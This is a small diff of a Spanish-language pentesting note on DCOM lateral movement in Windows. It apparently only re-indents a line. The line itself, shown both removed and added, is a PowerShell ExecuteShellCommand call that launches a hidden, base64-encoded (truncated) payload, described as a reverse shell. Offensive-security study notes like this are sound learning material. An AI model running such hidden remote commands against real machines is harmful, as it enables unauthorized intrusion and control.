@@ -203,5 +203,5 @@ Está por defecto activado en los sistemas Windows.
 	Los agumentos son:  `Command`, `Directory`, `Parameters`, `WindowsState`, y solo nos interesan el primero y el tercero
 - Podríamos ejecutar una revshell del siguiente modo: 
 	```powershell
-		$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAa...AHMAZQAoACkA","7")
+	$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAa...AHMAZQAoACkA","7")
 	```
